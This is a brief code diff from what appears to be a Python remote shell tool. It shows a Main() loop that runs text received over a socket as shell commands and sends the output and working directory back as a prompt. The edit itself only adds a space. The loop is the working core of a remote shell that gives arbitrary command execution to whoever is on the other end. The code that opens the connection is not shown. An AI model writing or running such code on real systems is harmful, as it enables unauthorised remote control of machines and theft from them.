@@ -21,7 +21,7 @@ def Main():
             cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
             out_bytes = cmd.stdout.read() + cmd.stderr.read()
             out_str = str(out_bytes, "utf-8")
-            client_socket.send(str.encode(out_str + str(os.getcwd())+ '> '))
+            client_socket.send(str.encode(out_str + str(os.getcwd()) + '> '))
 
     client_socket.close()
 
